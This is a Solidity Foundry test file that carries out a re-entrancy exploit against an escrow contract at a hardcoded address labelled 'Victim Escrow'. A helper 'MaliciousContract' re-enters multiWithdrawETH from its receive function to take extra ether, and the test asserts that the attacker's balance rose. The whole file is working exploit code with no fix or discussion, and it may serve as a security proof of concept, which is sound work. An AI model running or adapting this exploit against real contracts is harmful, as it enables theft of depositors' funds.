pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IEscrow {
    function deposit() external payable;
    function multiWithdrawETH(address[] calldata _recipients, uint256[] calldata _amounts, uint256 _totalAmount) external;
    function balanceOf(address _owner) external view returns (uint256);
}

contract MaliciousContract {
    IEscrow public target;
    address public attacker;
    bool public isAttacking;

    constructor(address _target) {
        target = IEscrow(_target);
        attacker = msg.sender;
    }

    receive() external payable {
        if (isAttacking) {
            isAttacking = false; // Prevent infinite loop
            address[] memory recipients = new address[](1);
            recipients[0] = attacker;
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = 1 ether;
            target.multiWithdrawETH(recipients, amounts, 1 ether);
        }
    }

    function startAttack() external {
        isAttacking = true;
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    MaliciousContract malicious;

    address constant TARGET = 0x89d7c52b999DE0f2D862eD944203BFA0526AE973;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(address(this), 10 ether);
        malicious = new MaliciousContract(TARGET);
        vm.label(address(malicious), "Malicious Contract");
        vm.label(TARGET, "Victim Escrow");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Deposit ETH to establish balance in escrow
        IEscrow(TARGET).deposit{value: 2 ether}();

        uint256 balanceBefore = address(this).balance;

        // Arm the malicious contract
        malicious.startAttack();

        // Call multiWithdrawETH - this is the vulnerable function
        address[] memory recipients = new address[](2);
        recipients[0] = address(malicious);
        recipients[1] = address(this);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1 ether;
        amounts[1] = 1 ether;

        IEscrow(TARGET).multiWithdrawETH(recipients, amounts, 2 ether);

        uint256 balanceAfter = address(this).balance;

        // Verify profit from re-entrancy
        assertGt(balanceAfter, balanceBefore, "Attacker balance did not increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
